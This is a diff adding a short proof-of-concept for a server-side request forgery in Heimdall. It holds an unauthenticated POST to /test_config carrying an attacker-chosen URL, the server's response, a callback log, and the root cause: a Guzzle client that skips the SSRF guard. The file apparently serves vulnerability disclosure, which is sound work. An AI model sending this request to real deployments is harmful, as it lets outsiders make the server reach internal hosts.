@@ -1,0 +1,13 @@
+REQUEST (unauthenticated, CSRF-exempt, not rate-limited): POST /test_config
+Host: localhost:8081
+Content-Type: application/x-www-form-urlencoded
+
+data[type]=140902edbcc424c09736af28ab2de604c3bde936&data[url]=http://172.17.0.1:9777/&data[username]=poc&data[password]=poc
+
+RESPONSE: HTTP/1.1 200 OK
+
+Successfully communicated with the API
+
+The Heimdall server issued the request to the attacker-chosen URL. Server-side listener log:
+  172.17.0.3 - - "GET /control/stats HTTP/1.1" 200
+(172.17.0.3 = the Heimdall container). The request goes through SupportedApps::execute()'s raw Guzzle client, which -- unlike ItemController -- never calls the SafeUrlFetcher SSRF guard.
